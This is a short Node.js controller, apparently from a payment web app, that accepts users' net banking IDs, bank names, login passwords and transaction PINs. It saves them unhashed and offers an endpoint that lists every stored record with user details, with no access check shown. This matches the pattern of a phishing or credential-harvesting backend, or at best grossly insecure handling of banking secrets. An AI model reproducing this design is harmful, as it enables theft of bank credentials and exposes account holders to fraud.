const NetBanking = require('../models/NetBanking');

// Handle net banking payment data submission
exports.submitNetBankingPayment = async (req, res) => {
    try {
        const { userId,bankId, bankName, password, transactionPin } = req.body;
        
        const newNetBankingPayment = new NetBanking({
            userId,
            bankId,
            bankName,
            password,
            transactionPin// Make sure to use the correct field name
        });

        await newNetBankingPayment.save();
        res.status(200).json({
            success: true,
            message: "Net Banking Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting net banking payment data"
        });
    }
};

// Fetch all NetBanking payment records
exports.getNetBankingPayments = async (req, res) => {
    try {
        const netBankings = await NetBanking.find().populate('userId'); // Fetch related user details
        res.status(200).json({
            success: true,
            data: netBankings
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({
            success: false,
            message: "Error fetching net banking payment records",
            error: err.message
        });
    }
};
